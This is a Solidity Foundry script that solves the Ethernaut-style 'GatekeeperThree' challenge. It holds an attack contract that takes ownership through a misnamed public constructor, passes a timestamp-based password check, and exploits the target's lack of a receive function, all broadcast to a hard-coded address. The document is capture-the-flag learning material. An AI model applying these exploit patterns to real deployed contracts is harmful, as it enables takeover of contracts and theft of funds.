
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/GateKeeperThree.sol";

/*
    Cope with gates and become an entrant.
    Things that might help:

        Recall return values of low-level functions.
        Be attentive with semantic.
        Refresh how storage works in Ethereum.

    Solution:
    1. Create contract that we will attack from (gate 1)
    2. Call construct0r to become owner (gate 1)
    3. Call createTrick() (gate 2)
    4. Call getAllowance(block.timestamp) (gate 2)
    5. Send gate keeper > 0.001 ether
    6. Do not have a receive function / have a receive function that returns false
    7. Call enter

*/

contract GatekeeperThreeAttack {
    function solve(GatekeeperThree _gk3) external payable {
        // 1. Gate 1: send through contract
        _gk3.construct0r();
        require(_gk3.owner() == address(this));

        // 2. Gate 2:
        // allowEntrace == true
        // gk3.getAllowance(timestamp of trick deployment) or read private var
        _gk3.createTrick();
        _gk3.getAllowance(block.timestamp);
        require(_gk3.allowEntrance() == true);
        require(_gk3.trick().checkPassword(block.timestamp));

        // 3. Gate 3:
        // gk3.balance > 0.001 ether
        // GK3Attack no receive function
        (bool success, ) = payable(address(_gk3)).call{
            value: address(this).balance
        }("");
        require(success);
        require(address(_gk3).balance > 0.001 ether);
        require(address(_gk3).balance == msg.value);

        // Enter
        _gk3.enter();
        console.log(_gk3.entrant());
        require(_gk3.entrant() == msg.sender);
    }
}


contract GateKeeperThreeSolution is Script {

    GatekeeperThree gk3 = GatekeeperThree(payable(0xB78a55374C953faB45E7466C3e7beaA3340F068f));
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        GatekeeperThreeAttack gka = new GatekeeperThreeAttack();
        gka.solve{value:0.002 ether}(gk3);
        console.log(gk3.entrant());

        vm.stopBroadcast();
    }
}